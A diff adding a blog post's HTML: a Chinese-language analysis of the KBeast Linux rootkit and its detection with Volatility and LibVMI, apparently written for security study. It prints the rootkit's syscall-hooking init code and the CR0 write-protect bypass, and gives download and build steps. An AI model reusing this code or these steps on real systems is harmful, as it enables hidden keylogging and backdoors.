@@ -1,0 +1,891 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  <link href="/blog/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+<link href="/blog/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/blog/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Security,Attack,Rootkit,Malware," />
+
+
+
+
+
+  <link rel="alternate" href="/blog/atom.xml" title="Diting0x" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/blog/images/avatar.jpg?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="0X00 全文环境
+0X01 Kbeast 特性
+0X02 系统调用劫持基础
+0X03 Kbeast 使用
+0X04 Kbeast 核心
+0X05 Kbeast Detection">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kbeast Analysis and Detection">
+<meta property="og:url" content="http://yoursite.com/blog/blog/2016/04/02/kbeast-analysis-detection/index.html">
+<meta property="og:site_name" content="Diting0x">
+<meta property="og:description" content="0X00 全文环境
+0X01 Kbeast 特性
+0X02 系统调用劫持基础
+0X03 Kbeast 使用
+0X04 Kbeast 核心
+0X05 Kbeast Detection">
+<meta property="og:updated_time" content="2016-04-21T20:57:06.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="kbeast Analysis and Detection">
+<meta name="twitter:description" content="0X00 全文环境
+0X01 Kbeast 特性
+0X02 系统调用劫持基础
+0X03 Kbeast 使用
+0X04 Kbeast 核心
+0X05 Kbeast Detection">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"hide"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+  <title> kbeast Analysis and Detection | Diting0x </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="http://s6.cnzz.com/stat.php?id=1257556336&web_id=1257556336" type="text/javascript"></script>
+  </div>
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/blog/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Diting0x</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">Keep Me Alive</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/blog/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/blog/" rel="section">
+            
+              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
+            
+            技术
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-life">
+          <a href="/blog/life" rel="section">
+            
+              <i class="menu-item-icon fa fa-question-circle fa-fw"></i> <br />
+            
+            生活
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/blog/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/blog/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/blog/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/blog/404.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-heartbeat fa-fw"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                kbeast Analysis and Detection
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-04-02T17:24:15-04:00" content="2016-04-02">
+              2016-04-02
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/blog/categories/security/" itemprop="url" rel="index">
+                    <span itemprop="name">security</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/blog/blog/2016/04/02/kbeast-analysis-detection/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="blog/2016/04/02/kbeast-analysis-detection/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<ul>
+<li>0X00 全文环境</li>
+<li>0X01 Kbeast 特性</li>
+<li>0X02 系统调用劫持基础</li>
+<li>0X03 Kbeast 使用</li>
+<li>0X04 Kbeast 核心</li>
+<li>0X05 Kbeast Detection </li>
+</ul>
+</blockquote>
+<a id="more"></a>
+<h3 id="0X00-全文环境"><a href="#0X00-全文环境" class="headerlink" title="0X00 全文环境"></a>0X00 全文环境</h3><p>Host Ubuntu 12.04 + Guest Ubuntu 10.04/11.04 + Libvmi + Volatility</p>
+<p>其中Kbeast运行在Guest Ubuntu 10.04/11.04中，libvmi与volatility运行在Host Ubuntu12.04中。</p>
+<h3 id="0X01-Kbeast-特性"><a href="#0X01-Kbeast-特性" class="headerlink" title="0X01 Kbeast 特性"></a>0X01 Kbeast 特性</h3><p>以下是Kbeast实现的功能：</p>
+<p>- 隐藏可加载模块（LKM)</p>
+<p>- 隐藏文件/目录</p>
+<p>- 隐藏进程（ps,pstree,top,lsof)</p>
+<p>- 隐藏套接字和网络连接(netstat,lsof)</p>
+<p>- 记录键盘操作捕获用户行为</p>
+<p>- 反杀死进程</p>
+<p>- 反移除文件</p>
+<p>- 反删除可加载模块</p>
+<p>- root提权后门</p>
+<p>- 远程绑定后门 </p>
+<h3 id="0X02-系统调用劫持基础"><a href="#0X02-系统调用劫持基础" class="headerlink" title="0X02 系统调用劫持基础"></a>0X02 系统调用劫持基础</h3><p>上述的Kbeast特性都是通过系统调用劫持实现的。在kernel 2.6.*之前，系统调用表”sys_call_table”是可以直接导出引用的，如：</p>
+<pre><code>extern void *sys_call_table[];
+sys_call_table[__NR_syscall] = pointer
+</code></pre><p>而在kernel 2.6.* 之后禁用了这种特性，并且其所在页是写保护的。然而，系统调用表依然在内存中，如果知道其所在内存地址，依然可以通过指针访问。内核中的符号表System.map （一般在/boot/目录下)记录了所有的符号及其地址，当然也包括系统调用表”sys_call_table”.  以Ubuntu 10.04为例，执行：</p>
+<pre><code>grep sys_call_table /boot/System.map-2.6.32-21-generic
+</code></pre><p>显示的结果为</p>
+<pre><code>c0592150 R sys_call_table
+</code></pre><p>c0592150指的是线性地址，R说明此地址所在的页面Read-only。目前的CPU都会将CR0控制寄存器的第16位（wp-bit）置1,将页面开启保护模式，这时CPU处于”write-proteed”模式，否则处于”read/write”模式。CR0寄存器的位描述可参考<a href="https://en.wikipedia.org/wiki/Control_register#CR0" target="_blank" rel="external">CR0</a>. </p>
+<p>如果能将WP位置0，就可以访问内存页面,读写系统调用表了。 下面这行代码便可实现此功能：</p>
+<pre><code>write_cr0 (read_cr0 () &amp; (~ 0x10000));
+</code></pre><h3 id="0X03-Kbeast-使用"><a href="#0X03-Kbeast-使用" class="headerlink" title="0X03 Kbeast 使用"></a>0X03 Kbeast 使用</h3><p>下载<a href="https://packetstormsecurity.com/files/108286/KBeast-Kernel-Beast-Linux-Rootkit-2012.html" target="_blank" rel="external">Kbeast</a>. </p>
+<pre><code>tar xzf ipsecs-kbeast-v1.tar.gz
+cd kbeast-v1
+./setup build 1  
+</code></pre><p>具体可参考/kbeast-v1/setup 文件，参数1表示默认为kernel 2.6.32。测试过ubuntu11.04 内核为2.6.38，setup出错，作者声称：<br>Be kind to note that the beast has been tested in, but not limited to, kernel 2.6.9,<br>2.6.16, 2.6.18, 2.6.32, 2.6.35 (i386 or x86_64)，理论上只要修改setup相关参数以及ipsecs-kbeast-vl.c文件中的系统调用表的地址即可适应其它版本内核，未测试。</p>
+<p>成功编译后，kbeast就会加载到内核空间，rootkit安装在/usr/<em>h4x</em>路径下，生成/usr/<em>h4x</em>/_h4x_bd进程，以及acctlog 记录文件， 路径以及文件名等参数可以在config.h文件中配置。当然在目标机器guest中无法找到相关文件，因为已经被隐藏了。下文会利用volatility检测到相关进程的路径。</p>
+<h3 id="0X04-Kbeast-核心"><a href="#0X04-Kbeast-核心" class="headerlink" title="0X04 Kbeast 核心"></a>0X04 Kbeast 核心</h3><p>Kbeast以LKM的方式存在，以下是其核心代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*init module insmod*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="comment">//Uncomment to hide this module</span></span><br><span class="line">  list_del_init(&amp;__this_module.<span class="built_in">list</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> tcp_seq_afinfo *my_afinfo = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="comment">//proc_net is disappeared in 2.6.32, use init_net.proc_net</span></span><br><span class="line">  <span class="keyword">struct</span> proc_dir_entry *my_dir_entry = init_net.proc_net-&gt;subdir;  </span><br><span class="line"></span><br><span class="line">  write_cr0 (read_cr0 () &amp; (~ <span class="number">0x10000</span>));</span><br><span class="line">  <span class="keyword">if</span>(_KEYLOG_)&#123;</span><br><span class="line">    o_read=(void *)sys_call_table[__NR_read];</span><br><span class="line">    sys_call_table[__NR_read]=h4x_read;</span><br><span class="line">  &#125;</span><br><span class="line">  o_write=(void *)sys_call_table[__NR_write];</span><br><span class="line">  sys_call_table[__NR_write]=h4x_write;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">if</span> defined(__x86_64__)</span></span><br><span class="line">    o_getdents=sys_call_table [__NR_getdents];</span><br><span class="line">    sys_call_table [__NR_getdents]=h4x_getdents;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">elif</span> defined(__i386__)</span></span><br><span class="line">    o_getdents64=sys_call_table [__NR_getdents64];</span><br><span class="line">    sys_call_table [__NR_getdents64]=h4x_getdents64;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">error</span> Unsupported architecture</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  o_unlink = sys_call_table [__NR_unlink];</span><br><span class="line">  sys_call_table [__NR_unlink] = h4x_unlink;</span><br><span class="line">  o_rmdir = sys_call_table [__NR_rmdir];</span><br><span class="line">  sys_call_table [__NR_rmdir] = h4x_rmdir;</span><br><span class="line">  o_unlinkat = sys_call_table [__NR_unlinkat];</span><br><span class="line">  sys_call_table [__NR_unlinkat] = h4x_unlinkat;</span><br><span class="line">  o_rename = sys_call_table [__NR_rename];</span><br><span class="line">  sys_call_table [__NR_rename] = h4x_rename;</span><br><span class="line">  o_open = sys_call_table [__NR_open];</span><br><span class="line">  sys_call_table [__NR_open] = h4x_open;</span><br><span class="line">  o_kill = sys_call_table [__NR_kill];</span><br><span class="line">  sys_call_table [__NR_kill] = h4x_kill;</span><br><span class="line">  o_delete_module = sys_call_table [__NR_delete_module];</span><br><span class="line">  sys_call_table [__NR_delete_module] = h4x_delete_module;</span><br><span class="line">  write_cr0 (read_cr0 () | <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(<span class="built_in">strcmp</span>(my_dir_entry-&gt;name, <span class="string">"tcp"</span>))</span><br><span class="line">    my_dir_entry = my_dir_entry-&gt;next;</span><br><span class="line">  <span class="keyword">if</span>((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry-&gt;data))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//seq_show is disappeared in 2.6.32, use seq_ops.show</span></span><br><span class="line">    old_tcp4_seq_show = my_afinfo-&gt;seq_ops.show;</span><br><span class="line">    my_afinfo-&gt;seq_ops.show = h4x_tcp4_seq_show;</span><br><span class="line">  &#125;</span><br><span class="line">  return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先将模块隐藏，取消CR0写保护，找到系统调用表地址，将其处理函数换成自己的函数，分别对应其中的特性。 如：</p>
+<pre><code>sys_call_table[__NR_read]=h4x_read; // log key
+sys_call_table[__NR_write]=h4x_write; // fake output ps,pstree,top,lsof
+sys_call_table [__NR_getdents]=h4x_getdents; //hide file and directory
+sys_call_table [__NR_unlink] = h4x_unlink; //Don&apos;t allow your file to be removed
+sys_call_table [__NR_rmdir] = h4x_rmdir; //Don&apos;t allow your directory to be removed
+sys_call_table [__NR_unlinkat] = h4x_unlinkat; //Don&apos;t allow your file and directory to be removed 
+sys_call_table [__NR_rename] = h4x_rename; //Don&apos;t allow your file to be renamed/moved
+sys_call_table [__NR_open] = h4x_open; //Don&apos;t allow your file to be overwrited
+sys_call_table [__NR_kill] = h4x_kill; //Don&apos;t allow your process to be killed
+sys_call_table [__NR_delete_module] = h4x_delete_module;
+</code></pre><h3 id="0X05-Kbeast-Detection-Using-Libvmi-and-Volatility"><a href="#0X05-Kbeast-Detection-Using-Libvmi-and-Volatility" class="headerlink" title="0X05 Kbeast Detection Using Libvmi and Volatility"></a>0X05 Kbeast Detection Using Libvmi and Volatility</h3><p>检测之前，先按照 <a href="http://www.chongh.wiki/blog/2016/03/30/virt-setup-analysis/" target="_blank" rel="external">上一篇</a> 文章搭好环境。</p>
+<p>以下是分别利用volatility的linux_psaux、linux_pslist、linux_pstree、linux_lsof、linux_proc_maps、linux_chech_modules插件检测出来的结果，能检测出其隐藏的进程、模块、进程间的关系以及所在路径。</p>
+<pre><code>python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_psaux | grep _h4x_bd
+
+Pid    Uid    Gid    Arguments 
+2316   2      2      ./_h4x_bd
+
+ python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslist | grep _h4x_bd 
+
+ Offset     Name                 Pid             Uid             Gid    DTB      Start Time
+ 0xf579e680 _h4x_bd              2316            2               2      0x357c5000 2016-04-01 21:41:29 UTC+0000
+
+
+  python vol.py -l vmi://1004desktop32         --profile=Linuxubuntu1004desktopx86 linux_pstree | grep _h4x_bd 
+
+ Name                 Pid             Uid 
+ ._h4x_bd             2316            2 
+
+ python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslsof | grep _h4x_bd 
+
+  Offset             Name                           Pid      FD       Path
+  0x00000000f579e680 _h4x_bd                            2316        1 /dev/pts/0
+0x00000000f579e680 _h4x_bd                            2316        2 /dev/pts/0
+0x00000000f579e680 _h4x_bd                            2316        3 socket:[11708]
+
+python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_proc_maps | grep _h4x_bd 
+
+
+ linux_proc_maps
+
+
+ Offset             Pid      Name                 Start              End         
+       Flags       Pgoff Major  Minor  Inode      File Path
+
+
+
+
+ 0x00000000f579e680     2316 _h4x_bd                  0x0000000000adb000 0x0000000000adc000 ---      0x153000    251      1     134375 /lib/tls/i686/cmov/libc-2.11.1.so
+0x00000000f579e680     2316 _h4x_bd              0x0000000000adc000 0x0000000000ade000 r--      0x153000    251      1     134375 /lib/tls/i686/cmov/libc-2.11.1.so
+0x00000000f579e680     2316 _h4x_bd              0x0000000000ade000 0x0000000000adf000 rw-      0x155000    251      1     134375 /lib/tls/i686/cmov/libc-2.11.1.so
+0x00000000f579e680     2316 _h4x_bd              0x0000000000adf000 0x0000000000ae2000 rw-           0x0      0      0          0 
+0x00000000f579e680     2316 _h4x_bd              0x0000000008048000 0x0000000008049000 r-x           0x0    251      1     136169 /usr/_h4x_/_h4x_bd
+0x00000000f579e680     2316 _h4x_bd              0x0000000008049000 0x000000000804a000 r--        0x1000    251      1     136169 /usr/_h4x_/_h4x_bd
+0x00000000f579e680     2316 _h4x_bd              0x000000000804a000 0x000000000804b000 rw-        0x2000    251      1     136169 /usr/_h4x_/_h4x_bd
+0x00000000f579e680     2316 _h4x_bd              0x00000000b7875000 0x00000000b7876000 rw-           0x0      0      0          0 
+0x00000000f579e680     2316 _h4x_bd              0x00000000b7884000 0x00000000b7886000 rw-           0x0      0      0          0 
+0x00000000f579e680     2316 _h4x_bd              0x00000000bfd84000 0x00000000bfd99000 rw-           0x0      0      0          0 [stack]
+
+  python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_check_moudles | grep _h4x_bd   
+
+ Module Address Module Name             
+ 0xf805dae0 ipsecs_kbeast_v1
+</code></pre><p> 当要清除module时，执行./setup clean. 但仍然会残留一些文件，无法删除。</p>
+<pre><code>Checking for make : /usr/bin/make
+Removing Kernel Module
+Removing Compiled Kernel Module
+Stoping Network Daemon
+Removing Backdoor File
+rm: cannot remove `./_h4x_bd&apos;: Permission denied
+Removing Installation Directory
+rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.o.cmd&apos;:     Permission denied
+rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.o&apos;:         Permission denied
+rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.ko.cmd&apos;:     Permission denied
+rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.ko&apos;:         Permission denied
+rm: cannot remove                     `/usr/_h4x_/.tmp_versions/ipsecs-kbeast-v1.mod&apos;: Permission     denied
+rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.c&apos;:         Permission denied
+rm: cannot remove         `/usr/_h4x_/.ipsecs-kbeast-v1.mod.o.cmd&apos;: Permission denied
+rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.c&apos;:         Permission denied
+rm: cannot remove `/usr/_h4x_/bd-ipsecs-kbeast-v1.c&apos;:     Permission denied
+rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.o&apos;:     Permission denied
+rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.cc1&apos;:     Permission denied 
+</code></pre><hr>
+<p>本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)</p>
+<p>如转载本文请注明出处: <a href="http://www.chongh.wiki/blog/2016/04/02/kbeast-analysis-detection/" target="_blank" rel="external">http://www.chongh.wiki/blog/2016/04/02/kbeast-analysis-detection/</a></p>
+<p>作者[新浪微博：<a href="http://weibo.com/u/2767520802?is_all=1" target="_blank" rel="external">@diting0x</a>]</p>
+<hr>
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html" target="_blank" rel="external">http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html</a></p>
+<p><a href="http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf" target="_blank" rel="external">http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf</a></p>
+<p><a href="https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/" target="_blank" rel="external">https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/</a> </p>
+<p><a href="http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/" target="_blank" rel="external">http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/</a></p>
+<p><a href="http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html" target="_blank" rel="external">http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html</a></p>
+
+      
+    </div>
+    
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+<div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center">
+  <div>攒点碎银娶媳妇</div>
+  <button id="rewardButton", disable="enable", onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}", style="cursor: pointer; border: 0; outline: 0; border-radius: 100%; padding: 0; margin: 0; letter-spacing: normal; text-transform: none; text-indent: 0px; text-shadow: none">
+    <span onmouseover="this.style.color='rgb(236,96,0)';this.style.background='rgb(204,204,204)'" onMouseOut="this.style.color='#fff';this.style.background='rgb(236,96,0)'" style="display: inline-block; width: 70px; height: 70px; border-radius: 100%; line-height: 81px; color: #fff; font: 400 35px/75px 'microsofty'; background: rgb(236,96,0)">赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat512.JPG" alt="Diting0x WeChat Pay" style="width: 200px; max-width: 100%; display: inline-block"/>
+        <p>微信打赏</p>
+      </div>
+    
+    
+  </div>
+</div>
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/blog/tags/Security/" rel="tag">#Security</a>
+          
+            <a href="/blog/tags/Attack/" rel="tag">#Attack</a>
+          
+            <a href="/blog/tags/Rootkit/" rel="tag">#Rootkit</a>
+          
+            <a href="/blog/tags/Malware/" rel="tag">#Malware</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/blog/2016/03/30/virt-setup-analysis/" rel="next" title="A Comprehensive Virtualized Enviroment Setup and Analysis">
+                <i class="fa fa-chevron-left"></i> A Comprehensive Virtualized Enviroment Setup and Analysis
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog/blog/2016/04/08/linux-syscalls/" rel="prev" title="Linux系统调用权威指南">
+                Linux系统调用权威指南 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="blog/2016/04/02/kbeast-analysis-detection/"
+           data-title="kbeast Analysis and Detection" data-url="http://yoursite.com/blog/blog/blog/2016/04/02/kbeast-analysis-detection/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="Diting0x" />
+          <p class="site-author-name" itemprop="name">Diting0x</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/blog/">
+              <span class="site-state-item-count">16</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/blog/categories">
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/blog/tags">
+                <span class="site-state-item-count">27</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/blog/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/diting0x" target="_blank" title="微博">
+                  
+                  微博
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/diting0x" target="_blank" title="知乎">
+                  
+                  知乎
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.douban.com/people/diting0x/" target="_blank" title="豆瓣">
+                  
+                  豆瓣
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="" target="_blank" title="github">
+                  
+                  github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://diting0x.lofter.com/" target="_blank" title="lofter">
+                  
+                  lofter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element">
+            <div class="links-of-blogroll-title">
+              <i class="fa fa-globe fa-fw"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://yebangyu.org/" title="yebangyu" target="_blank">yebangyu</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://xiaolili.net/" title="wangli" target="_blank">wangli</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://skykewei.top/" title="dukewei" target="_blank">dukewei</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
